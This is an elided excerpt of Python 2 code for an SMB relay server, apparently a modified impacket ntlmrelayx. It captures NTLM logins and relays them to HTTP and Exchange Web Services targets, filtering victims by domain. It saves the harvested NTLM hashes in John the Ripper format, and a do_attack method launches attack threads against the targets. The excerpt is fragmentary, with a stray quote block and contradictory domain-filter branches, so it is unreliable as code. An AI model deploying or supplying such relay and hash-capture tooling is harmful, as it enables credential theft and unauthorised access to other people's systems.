...
from lib.clients.httprelayclient import  HTTPRelayClient
...
class SMBRelayServer(Thread):
    ...
    def SmbSessionSetup(self, connId, smbServer, recvPacket):
        ...
        if messageType == 0x01:
            ...
            if authenticateMessage['user_name'] != '':
                ...
                skipped = False
                if self.config.domainfilter is not None:
                    if (self.config.domainfilter) == (authenticateMessage['domain_name'].decode('utf-16')):
                        print "Debug: send ntlm http auth...."
                        clientResponse, errorCode = self.do_ntlm_auth(client, securityBlob, connData['CHALLENGE_MESSAGE']['challenge'])
                    else:
                        errorCode = STATUS_ACCESS_DENIED
                        skipped = True
                        LOG.info(
                            "Skip Authenticating against %s://%s as %s\%s because filter domain mismatch. But we got login" % (
                        ...
                        if self.server.getJTRdumpPath() != '':
                            writeJohnOutputToFile(datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'")+" Skipped - "+ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
            ...
            if errorCode != STATUS_SUCCESS:
                ...
                if not skipped:
                    # Log this target as processed for this client
                    self.targetprocessor.logTarget(self.target)
                    LOG.error("Authenticating against %s://%s as %s\%s FAILED. Login stored" % (
                    self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                    authenticateMessage['user_name']))
                    ...
                    if self.server.getJTRdumpPath() != '':
                        writeJohnOutputToFile(datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'")+" Failed - "+ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                              self.server.getJTRdumpPath())
            else:
                ...
                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'")+" Succeed - "+ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())
                ...
                if authenticateMessage['user_name'] != '':
                    ...
                    if self.config.domainfilter is not None:
                        if (self.config.domainfilter) == (authenticateMessage['domain_name'].decode('utf-16')):
                            ...
                            errorCode = STATUS_ACCESS_DENIED
                            skipped = True
                            LOG.info("Skip Authenticating against %s://%s as %s\%s because filter domain mismatch. But we got login" % (
                                self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                                authenticateMessage['user_name']))
                    ...
                    if not skipped:
                        ...
                        if self.server.getJTRdumpPath() != '':
                            writeJohnOutputToFile(
                                datetime.datetime.now().strftime("'%Y/%m/%d %H:%M:%S'") + " Failed - " +
                                ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                self.server.getJTRdumpPath())
    ...
    def init_client(self,extSec):
        ...
        return client
        '''
        if self.target[0].upper() == 'HTTP' or self.target[0].upper() == 'HTTPS':
            ...
            if self.target.port is None:
                if self.target.scheme.upper() == 'HTTP':
                    #client = HTTPRelayClient(self.config,"%s://%s:80/%s" % (self.target.scheme.lower(), self.target.hostname, self.target.path),self.config.ewsBody)
                    client = HTTPRelayClient(self.config, self.target, extendedSecurity=extSec, body=self.config.ewsBody)
                else:
                    client = HTTPRelayClient(self.config, self.target, targetPort=443, extendedSecurity=extSec, body=self.config.ewsBody)
            else:
                if self.target.scheme.upper() == 'HTTP':
                    client = HTTPRelayClient(self.config, self.target, extendedSecurity=extSec, body=self.config.ewsBody)
                else:
    ...
    def do_attack(self,client):
        ...
        if self.target.scheme.upper() in self.config.attacks:
            ...
            clientThread = self.config.attacks[self.target.scheme.upper()](self.config, client, self.authUser)
            clientThread.start()
        else:
